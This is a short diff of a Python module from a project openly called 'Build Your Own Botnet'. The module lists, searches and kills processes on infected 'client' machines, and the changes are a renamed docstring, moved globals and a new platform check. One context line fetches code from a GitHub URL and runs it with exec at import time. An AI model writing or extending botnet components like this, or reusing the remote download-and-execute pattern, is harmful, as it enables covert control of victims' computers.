@@ -1,6 +1,6 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
-'Process Tools (Build Your Own Botnet)'
+'Process Utilities (Build Your Own Botnet)'
 
 # standard libarary
 import os
@@ -19,15 +19,21 @@ exec compile(urllib.urlopen('https://raw.githubusercontent.com/colental/byob/mas
 sys.modules['util'] = util
 
 # globals
-_buffer = StringIO.StringIO()
-_workers = {}
-_abort  = False
 packages  = []
 platforms = ['win32','linux2','darwin']
 usage = 'process <list/search/kill>'
 description = """ 
 List or search currently running processes on the client host machine
 """
+_buffer = StringIO.StringIO()
+_workers = {}
+_abort  = False
+
+# setup
+if util.is_compatible(platforms, __name__):
+    util.imports(packages, globals())
+else:
+    sys.exit()
 
 # main
 def list(*args, **kwargs):
